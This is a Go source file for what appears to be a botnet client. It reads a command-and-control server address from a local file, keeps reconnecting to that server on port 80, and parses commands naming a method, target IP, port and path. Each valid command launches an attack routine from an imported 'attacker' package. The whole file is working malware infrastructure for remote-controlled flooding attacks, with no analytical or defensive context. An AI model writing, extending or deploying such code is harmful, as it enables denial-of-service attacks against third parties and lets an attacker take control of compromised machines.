package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"bot/attacker"
)

const (
	c2File     = "./serverfile/c2.txt"
	retryPeriod = 10 * time.Second
)

func main() {
	c2Addr := readC2Address()

	for {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:80", c2Addr))
		if err != nil {
			log.Printf("Failed to connect to C2: %v, retrying in %s...", err, retryPeriod)
			time.Sleep(retryPeriod)
			continue
		}

		log.Printf("Successfully connected to C2 server: %s", c2Addr)
		handleC2Connection(conn)
		conn.Close()
		log.Println("Connection interrupted, retrying...")
	}
}

func readC2Address() string {
	data, err := os.ReadFile(c2File)
	if err != nil {
		log.Fatalf("Failed to read C2 address file: %v", err)
	}
	return strings.TrimSpace(string(data))
}

func handleC2Connection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				log.Println("C2 server closed the connection")
			} else {
				log.Printf("Error reading command: %v", err)
			}
			return
		}

		command = strings.TrimSpace(command)
		log.Printf("Received command: %s", command)

		if method, ip, port, path, ok := parseCommand(command); ok {
			go attacker.AttackInit(method, ip, port, path)
			log.Printf("Attack started: [%s] %s:%d%s", method, ip, port, path)
		}
	}
}

func parseCommand(cmd string) (string, string, int, string, bool) {
	parts := strings.Fields(cmd)

	// Handle stop command
	if len(parts) > 0 && parts[0] == "STOP" {
		return "STOP", "", 0, "", true
	}

	// Check if there are enough parameters (at least method, IP, and port)
	if len(parts) < 3 {
		log.Printf("Invalid command format: %s", cmd)
		return "", "", 0, "", false
	}

	// Validate IP address
	ip := net.ParseIP(parts[1])
	if ip == nil {
		log.Printf("Invalid IP address: %s", parts[1])
		return "", "", 0, "", false
	}

	// Validate port number
	port, err := strconv.Atoi(parts[2])
	if err != nil || port < 1 || port > 65535 {
		log.Printf("Invalid port number: %s", parts[2])
		return "", "", 0, "", false
	}

	// Handle optional path parameter
	path := ""
	if len(parts) > 3 {
		path = parts[3]
		// Ensure the path starts with /
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}
	}

	return parts[0], parts[1], port, path, true
}